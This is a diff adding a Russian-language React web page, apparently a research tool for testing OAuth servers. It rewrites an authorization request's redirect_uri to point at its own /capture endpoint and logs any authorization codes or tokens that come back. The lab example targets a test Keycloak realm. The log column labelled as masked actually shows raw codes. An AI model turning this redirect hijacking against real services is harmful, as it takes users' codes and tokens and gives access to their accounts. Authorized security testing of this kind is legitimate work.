@@ -1,0 +1,649 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Observer — redirect_uri Research Server</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <script crossorigin src="https://unpkg.com/react@18/umd/react.development.js"></script>
+  <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
+  <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+  <style>
+    :root {
+      --bg:            #fdf8f8;
+      --surface:       #f9f1f1;
+      --surface-inner: #f5eaea;
+      --border:        #d47b7b;
+      --border-soft:   #e8cccc;
+      --text:          #231f20;
+      --muted:         #6b5a5a;
+      --code-bg:       #f0e6e6;
+      --code-border:   #ddc0c0;
+      --tag-code:      #7b2222;
+      --danger:        #e53e3e;
+      --danger-hover:  #c53030;
+      --success:       #38a169;
+      --success-hover: #2f855a;
+      --neutral:       #7a6b6b;
+      --neutral-hover: #5e5050;
+      --warning-bg:    #fff8e1;
+      --warning-border:#f0c040;
+      --warning-text:  #7a5700;
+      --shadow:        0 4px 24px rgba(160,80,80,.10);
+      --radius:        12px;
+      --radius-sm:     6px;
+    }
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html { -webkit-font-smoothing: antialiased; }
+    body {
+      font-family: 'Inter', sans-serif;
+      font-size: 1rem;
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      padding: 24px 16px 48px;
+    }
+    .page { max-width: 1200px; margin: 0 auto; }
+
+    .shell {
+      background: var(--surface);
+      border: 2px solid var(--border);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow);
+      padding: 28px 24px 24px;
+      margin-bottom: 20px;
+    }
+
+    .hero { text-align: center; margin-bottom: 20px; }
+    .hero h1 { font-size: clamp(1.5rem,2vw,1.9rem); font-weight: 800; margin-bottom: 10px; line-height: 1.2; }
+    .hero p  { color: var(--muted); font-size: .97rem; line-height: 1.55; max-width: 900px; margin: 0 auto; }
+
+    code, .mono {
+      background: var(--code-bg); border: 1px solid var(--code-border);
+      border-radius: 4px; padding: 1px 6px;
+      font-family: ui-monospace,Consolas,monospace; font-size: .88em; color: var(--tag-code);
+    }
+
+    .divider { border: none; border-top: 1px solid var(--border-soft); margin: 18px 0; }
+    .sec-title { font-size: 1.3rem; font-weight: 700; text-align: center; margin-bottom: 14px; }
+
+    .field { margin-bottom: 13px; }
+    label  { display: block; font-size: 1rem; font-weight: 700; margin-bottom: 6px; line-height: 1.4; }
+    label .hint { font-weight: 500; color: var(--muted); font-size: .91em; }
+
+    input[type="text"], textarea {
+      width: 100%;
+      background: #f0e8e8;
+      border: 2px solid #c9b3b3;
+      border-radius: 4px;
+      padding: 11px 13px;
+      font-size: .97rem;
+      font-family: inherit;
+      color: var(--text);
+      outline: none;
+      transition: border-color .18s, box-shadow .18s;
+    }
+    input[type="text"]:focus, textarea:focus {
+      border-color: var(--border);
+      box-shadow: 0 0 0 4px rgba(212,123,123,.14);
+    }
+    textarea {
+      font-family: ui-monospace,Consolas,monospace;
+      font-size: .9rem;
+      resize: vertical;
+    }
+    textarea.raw-input {
+      min-height: 100px;
+      background: #fff8f8;
+      border-color: var(--border);
+    }
+    textarea.final-url {
+      min-height: 80px;
+      background: #fff8f8;
+      border-color: #a0c878;
+    }
+    textarea.final-url:focus { box-shadow: 0 0 0 4px rgba(56,161,105,.14); border-color: #38a169; }
+
+    /* Param table */
+    .param-wrap {
+      border: 1px solid var(--border-soft);
+      border-radius: var(--radius-sm);
+      overflow: hidden;
+      margin-top: 4px;
+    }
+    .param-table { width: 100%; border-collapse: collapse; background: #fffafa; }
+    .param-table th {
+      background: var(--surface-inner); font-size: .82rem; font-weight: 700;
+      padding: 9px 11px; text-align: left; border-bottom: 2px solid var(--border-soft);
+    }
+    .param-table td { padding: 5px 7px; border-bottom: 1px solid #f0e0e0; vertical-align: middle; }
+    .param-table tr:last-child td { border-bottom: none; }
+    .param-table tr:hover td { background: #fdf4f4; }
+    .param-table td:first-child { width: 28%; }
+    .param-table td:nth-child(2) { width: 8%; text-align: center; }
+    .param-table input[type="text"] {
+      padding: 6px 9px; font-size: .88rem;
+      background: #f5ecec; border-color: #c9b3b3;
+    }
+    .param-table input.highlight-uri {
+      background: #fff3e0; border-color: #f0a000;
+      font-weight: 600;
+    }
+    .param-table input.replaced-uri {
+      background: #e8f5e9; border-color: #66bb6a;
+      font-weight: 600;
+    }
+    .key-cell {
+      font-family: ui-monospace,Consolas,monospace;
+      font-size: .86rem; color: var(--tag-code); font-weight: 600;
+    }
+    .param-row-del {
+      background: none; border: none; color: #c53030;
+      font-size: 1.05rem; cursor: pointer; padding: 0 5px; line-height: 1;
+      transition: color .15s;
+    }
+    .param-row-del:hover { color: var(--danger); }
+    .badge-replaced {
+      display: inline-block; background: #fff3e0; border: 1px solid #f0a000;
+      color: #7a4900; border-radius: 999px; font-size: .72rem; font-weight: 700;
+      padding: 1px 8px; margin-left: 6px; vertical-align: middle;
+    }
+    .badge-new {
+      display: inline-block; background: #e8f5e9; border: 1px solid #66bb6a;
+      color: #1b5e20; border-radius: 999px; font-size: .72rem; font-weight: 700;
+      padding: 1px 8px; margin-left: 6px; vertical-align: middle;
+    }
+
+    /* Buttons */
+    .btns { display: flex; gap: 9px; flex-wrap: wrap; margin-top: 13px; }
+    button {
+      border: none; border-radius: var(--radius-sm);
+      padding: 11px 20px; font-size: .93rem; font-weight: 600;
+      color: #fff; cursor: pointer;
+      transition: background .18s, transform .12s;
+    }
+    button:hover  { transform: translateY(-1px); }
+    button:active { transform: translateY(0); }
+    .btn-danger  { background: var(--danger); }
+    .btn-danger:hover  { background: var(--danger-hover); }
+    .btn-success { background: var(--success); }
+    .btn-success:hover { background: var(--success-hover); }
+    .btn-neutral { background: var(--neutral); }
+    .btn-neutral:hover { background: var(--neutral-hover); }
+    .btn-sm { padding: 7px 13px; font-size: .83rem; }
+
+    /* JSON */
+    .json-wrap { margin-top: 20px; }
+    .json-wrap h2 { text-align: center; font-size: 1.5rem; font-weight: 800; margin-bottom: 12px; }
+    pre {
+      background: var(--code-bg); border: 1px solid var(--code-border);
+      border-radius: 4px; padding: 15px 17px;
+      font-family: ui-monospace,SFMono-Regular,Consolas,monospace;
+      font-size: .88rem; line-height: 1.6; overflow: auto;
+      white-space: pre-wrap; word-break: break-all;
+    }
+    .note { margin-top: 10px; font-size: .93rem; font-weight: 600; }
+
+    /* Chips */
+    .chip {
+      display: inline-flex; align-items: center; gap: 4px;
+      padding: 2px 9px; border-radius: 999px; font-size: .76rem; font-weight: 700;
+    }
+    .chip-danger  { background: #fde8e8; color: #962b2b; }
+    .chip-success { background: #e8f5e9; color: #276130; }
+    .chip-neutral { background: #f0e6e6; color: #6b5a5a; }
+
+    /* Log table */
+    .tbl-wrap { border: 1px solid var(--border-soft); border-radius: var(--radius-sm); overflow: hidden; margin-top: 16px; }
+    table { width: 100%; border-collapse: collapse; background: #fffafa; }
+    th { background: var(--surface-inner); font-size: .83rem; font-weight: 700; padding: 10px 12px; text-align: left; border-bottom: 2px solid var(--border-soft); }
+    td { padding: 9px 12px; border-bottom: 1px solid #f0e0e0; font-size: .86rem; vertical-align: top; }
+    td code { font-family: ui-monospace,Consolas,monospace; color: var(--tag-code); font-size: .84em; word-break: break-all; }
+    tr:last-child td { border-bottom: none; }
+    tr:hover td { background: #fdf4f4; }
+
+    .alert {
+      display: flex; align-items: flex-start; gap: 10px;
+      background: var(--warning-bg); border: 1px solid var(--warning-border);
+      border-radius: var(--radius-sm); padding: 10px 13px;
+      font-size: .91rem; color: var(--warning-text); margin-bottom: 14px;
+    }
+    .poll-badge { font-size: .77rem; color: var(--muted); margin-top: 6px; }
+    .dot-anim { animation: blink 1.4s infinite; }
+    @keyframes blink { 0%,100%{opacity:1} 50%{opacity:.3} }
+  </style>
+</head>
+<body>
+<div id="root"></div>
+<script type="text/babel">
+const { useState, useEffect, useCallback } = React;
+
+const CAPTURE_PATH = '/capture';
+
+/* ── утилиты ── */
+function maskSecret(v) {
+  if (!v || typeof v !== 'string') return v;
+  return v.length <= 8 ? '****' : v.slice(0,6)+'…[MASKED]';
+}
+
+function parseRawUrl(raw) {
+  const str = raw.trim();
+  if (!str) return null;
+  try {
+    // поддерживаем вставку "GET http://..." из DevTools
+    const cleaned = str.replace(/^GET\s+/i,'').replace(/\s+HTTP\/[\d.]+$/i,'').trim();
+    const u = new URL(cleaned);
+    const rows = [];
+    u.searchParams.forEach((v,k) => rows.push({ id: uid(), key: k, value: v, original: v }));
+    return { base: u.origin + u.pathname, rows };
+  } catch { return null; }
+}
+
+let _id = 0;
+function uid() { return ++_id; }
+
+function buildUrl(base, rows) {
+  const p = new URLSearchParams();
+  rows.forEach(r => { if (r.key.trim()) p.append(r.key.trim(), r.value); });
+  const qs = p.toString();
+  return base + (qs ? '?' + qs : '');
+}
+
+function riskChip(entry) {
+  if (!entry?.analysis) return null;
+  const { has_code, has_access_token, has_id_token, has_error } = entry.analysis;
+  if (has_code || has_access_token || has_id_token)
+    return <span className="chip chip-danger">⚠ Уязвимость подтверждена</span>;
+  if (has_error)
+    return <span className="chip chip-success">✓ Отклонено сервером</span>;
+  return <span className="chip chip-neutral">— Нет OAuth-параметров</span>;
+}
+
+/* ════════════════════════════════════════
+   Главное приложение
+════════════════════════════════════════ */
+function App() {
+  const captureUriDefault = window.location.origin + CAPTURE_PATH;
+
+  const [rawInput,    setRawInput]    = useState('');
+  const [parseError,  setParseError]  = useState('');
+  const [base,        setBase]        = useState('');
+  const [rows,        setRows]        = useState([]);
+  const [captureUri,  setCaptureUri]  = useState(captureUriDefault);
+  const [finalUrl,    setFinalUrl]    = useState('');
+  const [finalDirty,  setFinalDirty]  = useState(false);
+  const [replaced,    setReplaced]    = useState(false);
+
+  const [log,         setLog]         = useState([]);
+  const [total,       setTotal]       = useState(0);
+  const [lastAt,      setLastAt]      = useState(null);
+  const [selected,    setSelected]    = useState(null);
+  const [responseBlock, setResponseBlock] = useState({
+    message: 'Вставьте GET-запрос из DevTools и нажмите «Разобрать и подменить redirect_uri»'
+  });
+  const [copyLabel,   setCopyLabel]   = useState('Копировать');
+
+  /* синхронизация rows → finalUrl */
+  useEffect(() => {
+    if (finalDirty) return;
+    if (!base) return;
+    setFinalUrl(buildUrl(base, rows));
+  }, [base, rows, finalDirty]);
+
+  /* ── разобрать вставленный URL ── */
+  const handleParse = () => {
+    setParseError('');
+    const parsed = parseRawUrl(rawInput);
+    if (!parsed) {
+      setParseError('Не удалось разобрать URL. Убедитесь, что вставлен корректный HTTP-запрос.');
+      return;
+    }
+    // подмена redirect_uri
+    let wasReplaced = false;
+    const newRows = parsed.rows.map(r => {
+      if (r.key === 'redirect_uri') {
+        wasReplaced = true;
+        return { ...r, value: captureUri, original: r.value };
+      }
+      return r;
+    });
+    // если redirect_uri не было — добавляем
+    if (!wasReplaced) {
+      newRows.push({ id: uid(), key: 'redirect_uri', value: captureUri, original: '' });
+    }
+    setBase(parsed.base);
+    setRows(newRows);
+    setReplaced(wasReplaced);
+    setFinalDirty(false);
+    const url = buildUrl(parsed.base, newRows);
+    setFinalUrl(url);
+    setResponseBlock({
+      action: wasReplaced
+        ? 'redirect_uri подменён на адрес наблюдателя'
+        : 'redirect_uri не найден — добавлен автоматически',
+      original_redirect_uri: wasReplaced
+        ? parsed.rows.find(r => r.key==='redirect_uri')?.value
+        : '(отсутствовал)',
+      new_redirect_uri: captureUri,
+      result_url: url,
+    });
+  };
+
+  /* ── изменение строки в таблице ── */
+  const updRow = (id, field, val) => {
+    setRows(prev => prev.map(r => r.id===id ? {...r, [field]: val} : r));
+    setFinalDirty(false);
+  };
+  const delRow = id => { setRows(prev => prev.filter(r => r.id!==id)); setFinalDirty(false); };
+  const addRow = () => { setRows(prev => [...prev, { id: uid(), key: '', value: '', original: '' }]); setFinalDirty(false); };
+
+  /* ── ручное редактирование финального URL ── */
+  const handleFinalChange = (val) => {
+    setFinalUrl(val);
+    setFinalDirty(true);
+    // обратный парсинг в таблицу
+    try {
+      const u = new URL(val);
+      const newRows = [];
+      u.searchParams.forEach((v,k) => newRows.push({ id: uid(), key: k, value: v, original: v }));
+      setBase(u.origin + u.pathname);
+      setRows(newRows);
+      setFinalDirty(false);
+    } catch {}
+  };
+
+  /* ── повторно подменить redirect_uri ── */
+  const handleReplace = () => {
+    const newRows = rows.map(r =>
+      r.key === 'redirect_uri' ? { ...r, value: captureUri } : r
+    );
+    setRows(newRows);
+    setFinalDirty(false);
+  };
+
+  /* ── отправить ── */
+  const handleSend = () => {
+    if (!finalUrl) return;
+    window.open(finalUrl, '_blank', 'noopener');
+    setResponseBlock(prev => ({ ...prev, sent_at: new Date().toISOString(), sent_url: finalUrl }));
+  };
+
+  const handleCopy = () => {
+    if (!finalUrl) return;
+    navigator.clipboard.writeText(finalUrl).then(() => {
+      setCopyLabel('Скопировано ✓'); setTimeout(() => setCopyLabel('Копировать'), 2000);
+    });
+  };
+
+  const handleReset = () => {
+    setRawInput(''); setBase(''); setRows([]); setFinalUrl('');
+    setFinalDirty(false); setReplaced(false); setParseError('');
+    setResponseBlock({ message: 'Сброшено. Вставьте новый запрос.' });
+  };
+
+  /* ── журнал ── */
+  const fetchLog = useCallback(async () => {
+    try {
+      const r = await fetch('/api/log');
+      const d = await r.json();
+      setLog(d.items || []); setTotal(d.total||0);
+      setLastAt(new Date().toLocaleTimeString('ru-RU'));
+      if (d.items?.length) setResponseBlock({ latest_captured: d.items[0] });
+    } catch {}
+  }, []);
+
+  useEffect(() => {
+    fetchLog();
+    const t = setInterval(fetchLog, 3000);
+    return () => clearInterval(t);
+  }, [fetchLog]);
+
+  const handleClear = async () => {
+    await fetch('/api/log',{method:'DELETE'});
+    setLog([]); setTotal(0); setSelected(null);
+    setResponseBlock({ message: 'Журнал очищен' });
+  };
+  const handleDownload = () => {
+    const blob = new Blob([JSON.stringify(log,null,2)],{type:'application/json'});
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = `observer-log-${Date.now()}.json`;
+    a.click();
+  };
+
+  /* ═══════════ RENDER ═══════════ */
+  return (
+    <main className="page">
+
+      {/* ── Верхняя карточка ── */}
+      <section className="shell">
+        <header className="hero">
+          <h1>Сервер наблюдения — подмена <code>redirect_uri</code></h1>
+          <p>
+            Вставьте GET-запрос из DevTools (строку вида&nbsp;
+            <code>GET http://...?client_id=...&amp;redirect_uri=...&amp;scope=...</code>),
+            нажмите <strong>«Разобрать»</strong> — параметры появятся в таблице,
+            а <code>redirect_uri</code> будет автоматически подменён на адрес <code>/capture</code>.
+            Отредактируйте любые параметры вручную и нажмите <strong>«Отправить»</strong>.
+          </p>
+        </header>
+
+        <hr className="divider"/>
+
+        {/* ── Шаг 1: вставка ── */}
+        <div className="field">
+          <label>
+            Шаг 1 — Вставьте GET-запрос из DevTools
+            <span className="hint"> (можно целиком со строкой «GET http://...» или просто URL)</span>
+          </label>
+          <textarea
+            className="raw-input"
+            value={rawInput}
+            onChange={e => setRawInput(e.target.value)}
+            spellCheck={false}
+            placeholder={"GET http://10.0.2.15:8080/realms/test-realm/protocol/openid-connect/auth?client_id=client_id&redirect_uri=http%3A%2F%2F10.0.2.15%3A3000&response_type=id_token+token&scope=openid+profile+email&nonce=abc123 HTTP/1.1\n\n— или просто URL без «GET» и «HTTP/1.1»"}
+          />
+          {parseError && (
+            <div style={{color:'var(--danger)',fontSize:'.9rem',marginTop:6,fontWeight:600}}>
+              ⚠ {parseError}
+            </div>
+          )}
+        </div>
+
+        <div className="field">
+          <label>
+            Адрес подмены <code>redirect_uri</code>
+            <span className="hint"> — куда сервер авторизации перенаправит с кодом</span>
+          </label>
+          <input type="text" value={captureUri} onChange={e => setCaptureUri(e.target.value)} />
+        </div>
+
+        <div className="btns">
+          <button className="btn-danger" onClick={handleParse}>
+            Разобрать и подменить redirect_uri
+          </button>
+          <button className="btn-neutral btn-sm" onClick={handleReset}>Сбросить</button>
+        </div>
+
+        {/* ── Шаг 2: таблица параметров ── */}
+        {rows.length > 0 && (<>
+          <hr className="divider"/>
+          <div className="sec-title">
+            Шаг 2 — Параметры запроса
+            {replaced
+              ? <span className="badge-replaced">redirect_uri подменён</span>
+              : <span className="badge-new">redirect_uri добавлен</span>}
+          </div>
+
+          <div className="field">
+            <label>Base URL</label>
+            <input type="text" value={base} onChange={e => { setBase(e.target.value); setFinalDirty(false); }} />
+          </div>
+
+          <div className="alert">
+            <span>✏️</span>
+            <span>Редактируйте значения прямо в таблице. Поле <code>redirect_uri</code> выделено цветом.
+            Изменения мгновенно отражаются в финальном URL ниже.</span>
+          </div>
+
+          <div className="param-wrap">
+            <table className="param-table">
+              <thead>
+                <tr>
+                  <th>Ключ</th>
+                  <th></th>
+                  <th>Значение</th>
+                  <th style={{width:36}}></th>
+                </tr>
+              </thead>
+              <tbody>
+                {rows.map(row => {
+                  const isUri = row.key === 'redirect_uri';
+                  const wasChanged = isUri && row.original && row.original !== row.value;
+                  return (
+                    <tr key={row.id}>
+                      <td>
+                        <input
+                          type="text"
+                          value={row.key}
+                          onChange={e => updRow(row.id,'key',e.target.value)}
+                          className={isUri ? 'highlight-uri' : ''}
+                        />
+                      </td>
+                      <td style={{textAlign:'center',fontSize:'.85rem',color:'var(--muted)'}}>
+                        {wasChanged ? '→' : '='}
+                      </td>
+                      <td>
+                        <input
+                          type="text"
+                          value={row.value}
+                          onChange={e => updRow(row.id,'value',e.target.value)}
+                          className={isUri ? 'replaced-uri' : ''}
+                        />
+                        {wasChanged && (
+                          <div style={{fontSize:'.75rem',color:'var(--muted)',marginTop:2,fontFamily:'ui-monospace,monospace',overflow:'hidden',textOverflow:'ellipsis',whiteSpace:'nowrap',maxWidth:'100%'}}>
+                            было: {row.original}
+                          </div>
+                        )}
+                      </td>
+                      <td>
+                        <button className="param-row-del" onClick={() => delRow(row.id)} title="Удалить">✕</button>
+                      </td>
+                    </tr>
+                  );
+                })}
+              </tbody>
+            </table>
+          </div>
+
+          <div className="btns" style={{marginTop:10}}>
+            <button className="btn-neutral btn-sm" onClick={addRow}>+ Добавить параметр</button>
+            <button className="btn-neutral btn-sm" onClick={handleReplace}>↺ Повторно подменить redirect_uri</button>
+          </div>
+        </>)}
+
+        {/* ── Шаг 3: финальный URL ── */}
+        {finalUrl && (<>
+          <hr className="divider"/>
+          <div className="field">
+            <label style={{fontSize:'1.05rem'}}>
+              Шаг 3 — Финальный GET-запрос
+              <span className="hint"> — можно редактировать напрямую</span>
+            </label>
+            <textarea
+              className="final-url"
+              value={finalUrl}
+              onChange={e => handleFinalChange(e.target.value)}
+              spellCheck={false}
+            />
+          </div>
+          <div className="btns">
+            <button className="btn-success" onClick={handleSend}>
+              ▶ Отправить запрос (открыть в браузере)
+            </button>
+            <button className="btn-neutral" onClick={handleCopy}>{copyLabel}</button>
+          </div>
+        </>)}
+
+        {/* ── JSON-блок ── */}
+        <div className="json-wrap">
+          <h2>Ответ /capture</h2>
+          <pre>{JSON.stringify(responseBlock, null, 2)}</pre>
+          <div className="note">
+            NOTE: если сервер авторизации не валидирует <code>redirect_uri</code>,
+            он перенаправит <code>code</code>&nbsp;/ токены на <code>/capture</code> —
+            событие появится в журнале ниже автоматически.
+          </div>
+        </div>
+      </section>
+
+      {/* ── Журнал ── */}
+      <section className="shell">
+        <div style={{display:'flex',alignItems:'center',justifyContent:'space-between',flexWrap:'wrap',gap:10,marginBottom:13}}>
+          <div className="sec-title" style={{margin:0}}>
+            Журнал перехваченных запросов
+            {total > 0 && <span style={{marginLeft:9,fontSize:'.92rem',fontWeight:500,color:'var(--muted)'}}>({total})</span>}
+          </div>
+          <div style={{display:'flex',gap:8}}>
+            <button className="btn-neutral btn-sm" onClick={handleDownload}>Скачать JSON</button>
+            <button className="btn-danger  btn-sm" onClick={handleClear}>Очистить</button>
+          </div>
+        </div>
+        {lastAt && (
+          <div className="poll-badge">
+            <span className="dot-anim">●</span>&nbsp;Обновляется каждые 3 сек · Последнее: {lastAt}
+          </div>
+        )}
+        <div className="tbl-wrap">
+          <table>
+            <thead>
+              <tr>
+                <th>Время</th>
+                <th>Метод</th>
+                <th>Статус</th>
+                <th>code (маск.)</th>
+                <th>state</th>
+                <th></th>
+              </tr>
+            </thead>
+            <tbody>
+              {log.length === 0 ? (
+                <tr><td colSpan="6" style={{textAlign:'center',color:'var(--muted)',padding:'24px'}}>
+                  Журнал пуст. Отправьте запрос и завершите OAuth-поток.
+                </td></tr>
+              ) : log.map(item => (
+                <tr key={item.id}>
+                  <td><code>{new Date(item.timestamp).toLocaleString('ru-RU')}</code></td>
+                  <td><span className="chip chip-neutral">{item.method}</span></td>
+                  <td>{riskChip(item)}</td>
+                  <td><code>{item.oauth?.code ?? '—'}</code></td>
+                  <td><code>{item.oauth?.state ?? '—'}</code></td>
+                  <td>
+                    <button className="btn-neutral btn-sm" onClick={() => {
+                      setSelected(item);
+                      setResponseBlock(item);
+                      window.scrollTo({top:0,behavior:'smooth'});
+                    }}>Подробнее</button>
+                  </td>
+                </tr>
+              ))}
+            </tbody>
+          </table>
+        </div>
+        {selected && (
+          <div className="json-wrap" style={{marginTop:16}}>
+            <h2 style={{fontSize:'1.3rem'}}>Детали события</h2>
+            <pre>{JSON.stringify(selected, null, 2)}</pre>
+          </div>
+        )}
+      </section>
+    </main>
+  );
+}
+
+ReactDOM.createRoot(document.getElementById('root')).render(<App />);
+</script>
+</body>
+</html>
